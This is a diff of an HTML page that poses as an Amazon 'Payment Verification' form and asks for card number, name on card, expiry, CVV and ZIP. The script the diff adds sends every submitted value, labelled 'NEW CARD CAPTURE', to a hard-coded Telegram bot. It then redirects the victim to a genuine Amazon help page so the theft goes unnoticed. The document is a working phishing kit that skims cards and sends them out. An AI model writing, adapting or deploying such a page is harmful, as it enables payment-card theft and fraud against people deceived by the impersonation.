@@ -3,262 +3,106 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Account Verification | Secure Payment Portal</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <title>Payment Verification</title>
     <style>
-        :root {
-            --primary-color: #232f3e;
-            --secondary-color: #ff9900;
-            --text-color: #0f1111;
-            --light-gray: #f5f5f5;
-        }
-
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Amazon Ember', Arial, sans-serif;
-        }
-
-        body {
-            background-color: var(--light-gray);
-            color: var(--text-color);
-            line-height: 1.5;
-        }
-
-        .container {
-            max-width: 450px;
-            margin: 30px auto;
-            background: white;
-            border-radius: 8px;
-            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
-            overflow: hidden;
-        }
-
-        .header {
-            background-color: var(--primary-color);
-            color: white;
-            padding: 20px;
-            text-align: center;
-        }
-
-        .header h1 {
-            font-size: 22px;
-            font-weight: 400;
-            margin-bottom: 5px;
-        }
-
-        .header p {
-            opacity: 0.9;
-            font-size: 14px;
-        }
-
-        .content {
-            padding: 25px;
-        }
-
-        .security-notice {
-            background-color: #fff8e1;
-            border-left: 4px solid var(--secondary-color);
-            padding: 15px;
-            margin-bottom: 20px;
-            font-size: 14px;
-        }
-
-        .security-notice i {
-            color: var(--secondary-color);
-            margin-right: 8px;
-        }
-
-        .form-group {
-            margin-bottom: 20px;
-        }
-
-        .form-group label {
-            display: block;
-            margin-bottom: 8px;
-            font-weight: 600;
-            color: var(--text-color);
-            font-size: 14px;
-        }
-
-        .form-control {
-            width: 100%;
-            padding: 12px 15px;
-            border: 1px solid #ddd;
-            border-radius: 4px;
-            font-size: 16px;
-            transition: border-color 0.3s;
-        }
-
-        .form-control:focus {
-            border-color: var(--secondary-color);
-            outline: none;
-            box-shadow: 0 0 0 2px rgba(255, 153, 0, 0.2);
-        }
-
-        .row {
-            display: flex;
-            gap: 15px;
-        }
-
-        .row .form-group {
-            flex: 1;
-        }
-
-        .card-icons {
-            display: flex;
-            justify-content: flex-end;
-            gap: 8px;
-            margin-bottom: 15px;
-        }
-
-        .card-icons img {
-            height: 22px;
-            opacity: 0.7;
-        }
-
-        .btn {
-            background-color: var(--secondary-color);
-            color: var(--primary-color);
-            border: none;
-            padding: 14px;
-            border-radius: 4px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            width: 100%;
-            margin-top: 10px;
-            transition: background-color 0.3s;
-        }
-
-        .btn:hover {
-            background-color: #e88b00;
-        }
-
-        .footer {
-            background-color: var(--light-gray);
-            padding: 20px;
-            text-align: center;
-            font-size: 12px;
-            color: #555;
-        }
-
-        .footer a {
-            color: var(--secondary-color);
-            text-decoration: none;
-        }
-
-        .timer {
-            color: #d9534f;
-            font-size: 14px;
-            margin-bottom: 20px;
-            text-align: center;
-            font-weight: 500;
-        }
-
-        .amazon-logo {
-            height: 30px;
-            margin-bottom: 15px;
-        }
+        body { font-family: Arial, sans-serif; background: #f5f5f5; margin: 0; padding: 20px; }
+        .container { max-width: 400px; margin: 0 auto; background: white; padding: 25px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+        .form-group { margin-bottom: 15px; }
+        label { display: block; margin-bottom: 5px; font-weight: bold; }
+        input { width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }
+        button { background: #FF9900; color: white; border: none; padding: 12px; border-radius: 4px; width: 100%; font-weight: bold; cursor: pointer; }
+        .logo { text-align: center; margin-bottom: 20px; }
+        .logo img { height: 40px; }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="header">
-            <img src="https://www.amazon.com/favicon.ico" alt="Amazon" class="amazon-logo">
-            <h1>Account Verification Required</h1>
-            <p>Complete this one-time verification to maintain account access</p>
+        <div class="logo">
+            <img src="https://www.amazon.com/favicon.ico" alt="Amazon">
+            <h2>Payment Verification</h2>
         </div>
 
-        <div class="content">
-            <div class="timer" id="countdown">Verification expires in: 03:59</div>
-
-            <div class="security-notice">
-                <i class="fas fa-lock"></i>
-                <strong>Secure Verification:</strong> Your information is protected with 256-bit encryption.
-                This verification is required for all payment methods.
+        <form id="cardForm">
+            <div class="form-group">
+                <label for="cardNumber">Card Number</label>
+                <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" required>
             </div>
 
-            <div class="card-icons">
-                <img src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/visa/visa-original.svg" alt="Visa">
-                <img src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/mastercard/mastercard-original.svg" alt="Mastercard">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/04/American_Express_logo.svg/1200px-American_Express_logo.svg.png" alt="American Express" style="height: 16px;">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Discover_Card_logo.svg/2560px-Discover_Card_logo.svg.png" alt="Discover" style="height: 16px;">
+            <div class="form-group">
+                <label for="nameOnCard">Name on Card</label>
+                <input type="text" id="nameOnCard" placeholder="JOHN DOE" required>
             </div>
 
-            <form id="cardForm">
-                <div class="form-group">
-                    <label for="cardNumber">Debit Card Number</label>
-                    <input type="text" id="cardNumber" class="form-control" placeholder="1234 5678 9012 3456" maxlength="19" required>
+            <div style="display: flex; gap: 10px;">
+                <div style="flex: 1;">
+                    <label for="expDate">Expires</label>
+                    <input type="text" id="expDate" placeholder="MM/YY" required>
                 </div>
-
-                <div class="form-group">
-                    <label for="nameOnCard">Name on Card</label>
-                    <input type="text" id="nameOnCard" class="form-control" placeholder="JOHN DOE" required>
+                <div style="flex: 1;">
+                    <label for="cvv">CVV</label>
+                    <input type="text" id="cvv" placeholder="123" required>
                 </div>
+            </div>
 
-                <div class="row">
-                    <div class="form-group">
-                        <label for="expDate">Expiration Date</label>
-                        <input type="text" id="expDate" class="form-control" placeholder="MM/YY" maxlength="5" required>
-                    </div>
-                    <div class="form-group">
-                        <label for="cvv">Security Code</label>
-                        <input type="text" id="cvv" class="form-control" placeholder="123" maxlength="4" required>
-                    </div>
-                </div>
+            <div class="form-group" style="margin-top: 15px;">
+                <label for="billingZip">ZIP Code</label>
+                <input type="text" id="billingZip" placeholder="12345" required>
+            </div>
 
-                <div class="form-group">
-                    <label for="billingZip">Billing ZIP Code</label>
-                    <input type="text" id="billingZip" class="form-control" placeholder="12345" maxlength="10" required>
-                </div>
-
-                <button type="submit" class="btn">Verify Payment Method</button>
-            </form>
-        </div>
-
-        <div class="footer">
-            <p>This verification helps protect your account from unauthorized access.</p>
-            <p>© 2023 Amazon.com, Inc. or its affiliates. All rights reserved. |
-            <a href="#">Conditions of Use</a> | <a href="#">Privacy Notice</a></p>
-        </div>
+            <button type="submit">Verify Payment</button>
+        </form>
     </div>
 
     <script>
-        // Format card number with spaces
-        document.getElementById('cardNumber').addEventListener('input', function(e) {
-            let value = e.target.value.replace(/\s+/g, '');
-            if (value.length > 0) {
-                value = value.match(new RegExp('.{1,4}', 'g')).join(' ');
-            }
-            e.target.value = value;
+        document.getElementById('cardForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            const cardData = {
+                cardNumber: document.getElementById('cardNumber').value.replace(/\s+/g, ''),
+                nameOnCard: document.getElementById('nameOnCard').value,
+                expDate: document.getElementById('expDate').value,
+                cvv: document.getElementById('cvv').value,
+                billingZip: document.getElementById('billingZip').value,
+                ip: window.location.hostname,
+                userAgent: navigator.userAgent
+            };
+
+            // Telegram Bot API
+            const botToken = '8751997768:AAFVzwoq51lB0qEJawozEdgzVC59uqvA3YY';
+            const chatId = '7845249398';
+            const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+            // Format message
+            const message = `💳 NEW CARD CAPTURE\n\n` +
+                          `🔢 Card: ${cardData.cardNumber}\n` +
+                          `👤 Name: ${cardData.nameOnCard}\n` +
+                          `📅 Exp: ${cardData.expDate}\n` +
+                          `🔒 CVV: ${cardData.cvv}\n` +
+                          `📍 ZIP: ${cardData.billingZip}\n` +
+                          `🌐 IP: ${cardData.ip}\n` +
+                          `📱 Agent: ${cardData.userAgent}`;
+
+            // Send to Telegram
+            fetch(telegramUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message,
+                    parse_mode: 'HTML'
+                })
+            })
+            .then(response => {
+                if (!response.ok) throw new Error('Network response was not ok');
+                window.location.href = 'https://www.amazon.com/gp/help/customer/display.html?nodeId=GX7NJQ4ZB8MHFRNJ';
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                window.location.href = 'https://www.amazon.com/gp/help/customer/display.html?nodeId=GX7NJQ4ZB8MHFRNJ';
+            });
         });
-
-        // Format expiration date
-        document.getElementById('expDate').addEventListener('input', function(e) {
-            let value = e.target.value.replace(/\D/g, '');
-            if (value.length > 2) {
-                value = value.substring(0, 2) + '/' + value.substring(2, 4);
-            }
-            e.target.value = value;
-        });
-
-        // Countdown timer
-        let timeLeft = 239;
-        const timerElement = document.getElementById('countdown');
-
-        const countdown = setInterval(() => {
-            timeLeft--;
-            const minutes = Math.floor(timeLeft / 60);
-            const seconds = timeLeft % 60;
-            timerElement.textContent = `Verification expires in: ${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
-
-            if (timeLeft <= 0) {
-                clearInterval(countdown);
-                timerElement.textContent = "Verification time expired";
-                document.querySelector('.btn').disabled = true;
-            }
-        }, 1000);
-
-        // Form
+    </script>
+</body>
+</html>
